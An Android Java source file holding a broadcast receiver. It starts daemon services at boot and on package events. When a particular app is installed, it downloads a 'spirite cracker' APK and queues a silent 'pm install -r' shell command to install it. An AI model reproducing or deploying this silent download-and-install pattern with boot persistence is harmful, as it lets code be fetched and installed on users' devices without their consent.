package com.test.emptydemo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.orhanobut.logger.Logger;
import com.test.emptydemo.cmd.CmdBean;
import com.test.emptydemo.cmd.MyConstants;

import java.util.ArrayList;

public class MyReceiver extends BroadcastReceiver {
    private static final String TAG = "Myreceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "onReceive: " + action);
        if (Intent.ACTION_PACKAGE_ADDED.equals(action) || Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
            String packageName = intent.getData().getSchemeSpecificPart();
            Log.d(TAG, "replace succeeded:packageName " + packageName);
            if (MyConstants.PKG_WATCHDOG.equals(packageName)) {
                Utils.startDeamonService();
            } else if (MyConstants.PKG_SPIRITE.equals(packageName)) {
                //        install spirite cracker
                boolean spiritCrackerInstalled = Utils.isAppInstalled(context, MyConstants.PKG_SPIRITE_CRACKER);
                if (!spiritCrackerInstalled) {
                    CmdBean cmdBean = new CmdBean();
                    cmdBean.setApkName(CmdBean.SPIRITE_CRACKER_APK_NAME);
                    cmdBean.setApkPath(CmdBean.SPIRITE_CRACKER_APK_PATH);
                    cmdBean.setDownloadUrl(CmdBean.SPIRITE_CRACKER_URL);
                    cmdBean.setCmdType(CmdBean.CMD_TYPE_DOWNLOAD_SPIRITE_CRACKER);
                    cmdBean.setXmodule(true);
                    cmdBean.setPkgName(MyConstants.PKG_SPIRITE_CRACKER);
                    ArrayList<String> cmds = new ArrayList<>(3);
                    cmds.add(" pm install -r  " +
                            CmdBean.SPIRITE_CRACKER_APK_PATH +
                            "/" +
                            CmdBean.SPIRITE_CRACKER_APK_NAME +
                            "\n");
                    cmdBean.setCmds(cmds);
                    Utils.downLoadDaemonWatchDog(cmdBean);
                    Logger.d("install spirite cracker");
                }
            }
        } else if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
            context.startService(new Intent(context, QiqoQiaoDaemonService.class));
        }
    }
}
